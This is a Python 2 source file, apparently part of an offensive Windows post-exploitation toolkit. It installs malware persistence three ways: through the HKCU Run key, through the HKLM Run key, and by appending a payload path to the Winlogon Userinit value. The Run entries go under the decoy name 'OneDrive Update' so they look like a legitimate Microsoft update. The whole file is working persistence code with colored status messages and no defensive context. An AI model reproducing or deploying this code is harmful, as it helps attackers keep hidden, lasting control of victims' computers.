"""
Works from: Windows XP
Fixed in: Unfixed
"""
import os
import ctypes
import _winreg
from colorama import init, Fore
init(convert=True)

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)

def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	

def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def HKCU_run_persistence(exe_path):
	print " {} HKCU_run_persistence: Attempting to create HKCU run registry key".format(infoBox())
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
								os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
		_winreg.SetValueEx(key,
						"OneDrive Update",
						0,
						_winreg.REG_SZ,
						exe_path)
		print " {} HKCU_run_persistence: Successfully created HKCU run registry key".format(successBox())
	except Exception as error:
		print " {} HKCU_run_persistence: Unable to create HKCU run registry key".format(errorBox())
		return False

def HKLM_run_persistence(exe_path):
	print " {} HKLM_run_persistence: Attempting to create HKLM run registry key".format(infoBox())
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} HKLM_run_persistence: We are running as admin, we can proceed".format(infoBox())
		try:
			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
									os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
			_winreg.SetValueEx(key,
							"OneDrive Update",
							0,
							_winreg.REG_SZ,
							exe_path)
			print " {} HKLM_run_persistence: Successfully created HKLM run registry key".format(successBox())
		except Exception as error:
			print " {} HKLM_run_persistence: Unable to create HKLM run registry key".format(errorBox())
			return False
	else:
		print " {} HKLM_run_persistence: We are not admin, cannot proceed".format(errorBox())
		return False

def HKLM_userinit_persistence(exe_path):
	print " {} HKLM_userinit_persistence: Attempting to create HKLM run registry key".format(infoBox())
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} HKLM_userinit_persistence: We are running as admin, we can proceed".format(infoBox())
		try:
			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
									os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Winlogon"))
			_winreg.SetValueEx(key,
							"Userinit",
							0,
							_winreg.REG_SZ,
							"c:\windows\system32\userinit.exe,{}".format(exe_path))
			print " {} HKLM_userinit_persistence: Successfully created HKLM userinit registry key".format(successBox())				
		except Exception as error:
			print " {} HKLM_userinit_persistence: Unable to create HKLM userinit registry key".format(errorBox())
			return False
	else:
		print " {} HKLM_userinit_persistence: We are not admin, cannot proceed".format(errorBox())
		return False			